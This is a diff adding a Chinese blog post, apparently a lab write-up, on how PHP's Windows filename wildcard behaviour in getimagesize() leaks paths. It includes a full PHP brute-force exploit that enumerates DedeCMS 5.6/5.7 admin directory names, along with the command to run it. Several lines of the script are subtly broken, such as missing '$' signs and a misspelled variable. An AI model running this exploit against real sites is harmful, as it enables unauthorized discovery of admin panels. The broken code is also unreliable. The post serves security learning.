@@ -1,0 +1,149 @@
+<!DOCTYPE HTML>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>文件判断函数的安全隐患</title>
+<meta name="author" content="John Doe">
+<!--[if IE]>
+  <meta http-equiv=refresh content='0, http://browsehappy.com'>
+<![endif]-->
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+<body oncontextmenu="return false">
+  <div class="aios_content">
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    <div class="menu-bg">
+  <div class="menu-container">
+    <ul>
+      
+        <li class="menu-item">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives">Docs</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+<nav>
+  <a></a>
+</nav>
+
+    <div class="container" style="padding-bottom:40px">
+      <div class="row">
+  <div class="col-sm-12">
+    <header>
+  <div class="logo">
+    <h1 id="main-title" class="title"><a href="/">Hexo</a></h1>
+  </div>
+</header>
+
+
+    <section class="main">
+      <div class="post">
+  <div class="post-header">
+    <h1 class="title">文件判断函数的安全隐患</h1>
+    <div class="post-info">
+      <span class="date">2019-02-12</span>
+
+      
+    </div>
+  </div>
+
+  <div class="content">
+    <!-- Gallery -->
+    
+
+    <p>来自i春秋的实验–文件判断函数的安全隐患问题</p>
+<p>在做完实验后，回忆了一下整个实验过程中的思路。</p>
+<p>这一次的实验主要是为了让我们了解PHP在windows上使用时，会出现的一些问题，而这些问题将会引起安全隐患。</p>
+<p>PHP语言在windows中会出现一些特性：</p>
+<p>大于号(&gt;)相等于通配符问号 ?</p>
+<p>小于号(&lt;)相当于通配符星号 *</p>
+<p>双引号(&quot;)相当于点字符 . </p>
+<p>现在本地验证一下。<br>新建一个PHP代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a =  $_GET[&apos;img&apos;];</span><br><span class="line">exec(&apos;pause&apos;);  </span><br><span class="line">if(@getimagesize($a))</span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;ok&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">     echo &quot;no&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<p>保存在php的wwww文件夹下，然后我们开启phpstudy，在wwww文件夹下新建一个文件夹，里面放一张png文件，文件名为1.png。<br><img src="/2019/02/12/文件判断函数的安全隐患/1.png" alt="1"><br><img src="/2019/02/12/文件判断函数的安全隐患/2.png" alt="2"></p>
+<p>输入url:<br><code>http://127.0.0.1/test.php?img=C:\phpStudy\PHPTutorial\WWW\test\1.png</code><br><img src="/2019/02/12/文件判断函数的安全隐患/3.png" alt="3"><br>输入url:<br><code>http://127.0.0.1/test.php?img=C:\phpStudy\PHPTutorial\WWW\t&lt;\1.png</code><br><img src="/2019/02/12/文件判断函数的安全隐患/4.png" alt="4"><br>实际上，我们发现这两个url返回的都是ok,方法–getimagesize()–通过获取图片的高度宽度等信息判断图片是否存在，那么这里的img变量如果未进行过滤处理将会存在安全隐患，比如我们可以通过我们可以通过一张已知的图片，通过穷举，来获取文件的所在的文件夹名，或者可以用于获取网站的后台，这个功能让我联想起之前用过的御剑后台扫描工具。dedecms 5.6 版本和dedecms 5.7 版本都存在这个漏洞。</p>
+<p><img src="/2019/02/12/文件判断函数的安全隐患/6.png" alt="6"><br>现在先挂上爆破dedecms后台的工具代码exp.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> /*</span><br><span class="line">  dedecms 后台爆破工具</span><br><span class="line">  使用程序时，必须指定dedecms的版本，例如：5.6</span><br><span class="line">  当你不确定dedecms版本时，请将5.6，5.7 两个版本都尝试一下</span><br><span class="line">  example: php.exe dedecms-exp.php 5.6 http://127.0.0.1/</span><br><span class="line"> */</span><br><span class="line">  if(!isset($argv[1]) or !isset(argv[2]))&#123;</span><br><span class="line">  	exit(&quot;error!\r\nExample:php.exe exp.php 5.6 http://127.0.0.1/&quot;);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  $domain = $argv[2];</span><br><span class="line">  $url = $domain.&apos;/tags.php&apos;;</span><br><span class="line">  $version = $argv[1];</span><br><span class="line">  $path = my_func($url);</span><br><span class="line"></span><br><span class="line">  if($path)</span><br><span class="line">  &#123;</span><br><span class="line">  	while(($path = my_func($url,$path))) &#123;</span><br><span class="line">  		echo strtolower($path).&quot;\r\n&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    for($i = 48;$i&lt;=90;$i++)&#123;</span><br><span class="line">       if((48&lt;=$i &amp;&amp; $i&lt;=57) or (65&lt;=$i &amp;&amp; $i &lt;= 90))&#123;</span><br><span class="line">       	$path = my_func($url,chr($i));</span><br><span class="line">       	while($path)&#123;</span><br><span class="line">       	   echo strtolower($path).&quot;\r\n&quot;;</span><br><span class="line">       	   $path = my_func($url,$path);	</span><br><span class="line">       	&#125;</span><br><span class="line">       &#125;     	</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">exit();</span><br><span class="line"></span><br><span class="line">function my_func($url,$path = &apos;&apos;)&#123;</span><br><span class="line">	$ch = curl_init($url);</span><br><span class="line">	$i = 48;</span><br><span class="line">	global $version;</span><br><span class="line"></span><br><span class="line">    while($i &lt;= 90)&#123;</span><br><span class="line">    	if((48 &lt;= $i &amp;&amp; $i&lt;= 57) or (65 &lt;= $i &amp;&amp; $i &lt;= 90))&#123;</span><br><span class="line">    		if(version != &apos;5.7&apos;)&#123;</span><br><span class="line">    			/*v5.6版本及其以下*/</span><br><span class="line">    			$admin_path = &apos;./&apos;.$path.chr($i).&apos;&lt;/img/admin_top_logo.gif&apos;;</span><br><span class="line">    	        &#125;</span><br><span class="line">    	     else&#123;</span><br><span class="line">    	     	/*v5.7版本*/</span><br><span class="line">                $admin_paht = &apos;./&apos;.$path.chr($i).&apos;&lt;/images/admin_top_logo.gif&apos;; </span><br><span class="line">    	        &#125;   </span><br><span class="line">             </span><br><span class="line">             $data = &apos;dopost=save&amp;_FILES[b4dboy][tmp_name]=&apos;.$admin_path.&apos;$_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&apos;;</span><br><span class="line">    	     $options = array(</span><br><span class="line">               CURLOPT_USERAGENT =&gt; &apos;firefox/58.0&apos;,</span><br><span class="line">               CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">               CURLOPT_POST =&gt; true,</span><br><span class="line">               CURLOPT_POSTFIELDS =&gt; $data,</span><br><span class="line">    	     );  </span><br><span class="line"></span><br><span class="line">    	     curl_setopt_array($ch, $options);</span><br><span class="line"></span><br><span class="line">    	     $response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">    	     if(!preg_match(&apos;/(Upload filetype not allow !)/i&apos;,$response))&#123;</span><br><span class="line">    	     	$path = $path.chr($i);</span><br><span class="line">    	     	return $path;</span><br><span class="line">    	     &#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  curl_close($ch);</span><br><span class="line">  return false;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>实际上这段代码很好理解，通过getimagesize的windows特性，我们可以进行穷举，将后台名穷举出来。<br>实际操作：将工具代码exp.php放入phpstudy中你所选择的php的版本，到该版本php文件夹中，打开cmd，输入<br><code>php.exe exp.php 5.6 http://172.16.12.2</code><br><img src="/2019/02/12/文件判断函数的安全隐患/5.png" alt="5"></p>
+<p>总结：在完成这个实验过程中，其实挺难受的，代码的审计能力太差，所以花了两天时间才能说是领悟了七层左右。希望在接下来的学习中能多多培养自己审计代码的能力.</p>
+<p>挂上我在学习过程中参考的一些文章，我觉得还蛮有用的:<br>(PHP源码调试之Windows文件通配符分析)[<a href="https://xz.aliyun.com/t/2004]" target="_blank" rel="noopener">https://xz.aliyun.com/t/2004]</a></p>
+
+    <span class="date end-date">2019-02-12</span>
+  </div>
+
+  
+
+  
+</div>
+
+    </section>
+  </div>
+</div>
+
+    </div>
+  </div>
+  <footer class="footer-content">
+  <div class="container">
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+        <h2>About</h2>
+        <section>
+          Theme developed by <a href="//github.com/klugjo" target="_blank">Jonathan Klughertz</a><br>Contents created by <a href="//github.com/xaios" target="_blank">AIOS</a>
+        </section>
+      </div>
+      
+  <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+    <h2>New Contents</h2>
+    <ul>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/12/PHPMywind储存XSS漏洞/">PHPMywind储存XSS漏洞</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/12/文件判断函数的安全隐患/">文件判断函数的安全隐患</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/08/BUGKU-WEB/">BUGKU-WEB</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/01/31/mysql注入常见load-file路径/">mysql注入常见load_file路径</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+      
+
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <ul class="list-inline footer-social-icons"></ul>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="footer-copyright">@Untitled. All right reserved | Design & Hexo <a href="//www.codeblocq.com" target="_blank">Jonathan Klughertz</a></div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</body>
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js"></script>
+<script src="/js/main.js"></script>
+
